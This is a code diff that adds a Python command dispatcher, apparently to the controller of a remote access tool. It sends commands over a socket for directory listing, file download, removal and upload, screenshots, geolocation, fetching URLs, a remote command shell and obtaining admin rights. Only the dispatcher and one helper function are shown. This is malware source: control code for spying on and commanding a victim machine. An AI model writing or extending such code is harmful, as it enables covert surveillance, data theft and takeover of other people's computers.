@@ -6,6 +6,40 @@ import datetime
 import time
 
 
+def check_command(conn,command):
+    if command == "pwd":
+        pwd(conn,command)
+
+    if command == "custom_dir":
+        custom_dir(conn,command)
+
+    if command == "download_file":
+        download_file(conn,command)
+
+    if command == "remove_file":
+        remove_file(conn,command)
+
+    if command == "send_file":
+        send_file(conn,command)
+
+    if command == "screenshot":
+        screenshot(conn,command)
+
+    if command == "geolocate":
+        geolocate(conn,command)
+
+    if command == "download_url":
+        download_url(conn,command)
+
+    if command == "cmd":
+        cmd(conn,command)                
+
+    if command == "help":
+        get_help()
+    
+    if command == "get_admin":
+        get_admin(conn,command)
+
 def pwd(conn,command):
     conn.send(command.encode())
     print("[+] Command has been sent. Waiting for execution...")
